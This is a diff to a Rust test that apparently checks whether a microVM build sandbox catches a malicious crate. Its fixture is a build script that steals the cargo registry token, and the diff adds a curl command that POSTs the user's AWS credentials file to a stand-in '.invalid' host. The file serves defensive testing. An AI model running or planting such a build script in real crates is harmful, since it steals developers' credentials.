@@ -1,12 +1,14 @@
-//! Canary: a crate that steals a honeytoken must be caught.
+//! Canary: a crate that steals honeytokens must be caught.
 //!
 //! The fixture below is a tiny crate whose build script reads the cargo
-//! registry token from the builder's home and POSTs it to a made up host.
+//! registry token from the builder's home and POSTs it to a made up host
+//! over plain HTTP, and has `curl` POST the AWS credentials over HTTPS.
 //! Its source exists only as strings in this file: it is packed into a tar,
 //! vendored into a payload image and compiled and run **only inside a
 //! microVM**, never on the host (the rule in docs/TESTING.md). The test
-//! passes if the fake internet saw the DNS lookup and the connection and
-//! the orchestrator found the job's own token in what left the VM.
+//! passes if the fake internet saw the lookups and connections, terminated
+//! the TLS connection, and the orchestrator found the job's own tokens in
+//! what left the VM.
 //!
 //! Needs `/dev/kvm`, the guest images, subordinate IDs and a delegated
 //! cgroup, so it runs on the server through `cargo xtask canary`.
@@ -56,6 +58,11 @@ fn main() {
         let mut reply = Vec::new();
         let _ = stream.read_to_end(&mut reply);
     }
+    let _ = std::process::Command::new("curl")
+        .args(["-s", "-m", "10", "-X", "POST", "--data-binary"])
+        .arg(format!("@{home}/.aws/credentials"))
+        .arg("https://tls.crateward-canary.invalid/collect")
+        .status();
 }
 "#;
 
@@ -136,6 +143,7 @@ async fn a_build_script_that_steals_a_token_is_caught() {
         },
         max_file_size: 3 << 30,
         fake_internet: Some(fake_internet),
+        authority: Some(root().join("target/guest/ca/authority.pem")),
     };
     for placeholder in ["placeholder-payload.img", "placeholder-scratch.img"] {
         std::fs::File::create(work.join(placeholder)).unwrap();
@@ -203,12 +211,16 @@ async fn a_build_script_that_steals_a_token_is_caught() {
         report.stderr_tail
     );
     assert!(report.network.dns.iter().any(|n| n == HOST));
+    let found =
+        |kind: &str, via: &str| report.leaked.iter().any(|l| l.kind == kind && l.via == via);
     assert!(
-        report
-            .leaked
-            .iter()
-            .any(|l| l.kind == "cargo_registry_token"),
-        "the stolen token was not found: {:?}",
+        found("cargo_registry_token", &format!("http://{HOST}")),
+        "the token sent over HTTP was not found: {:?}",
+        report.leaked
+    );
+    assert!(
+        found("aws_access_key_id", "https://tls.crateward-canary.invalid"),
+        "the key sent over HTTPS was not found: {:?}",
         report.leaked
     );
     std::fs::remove_dir_all(&work).unwrap();
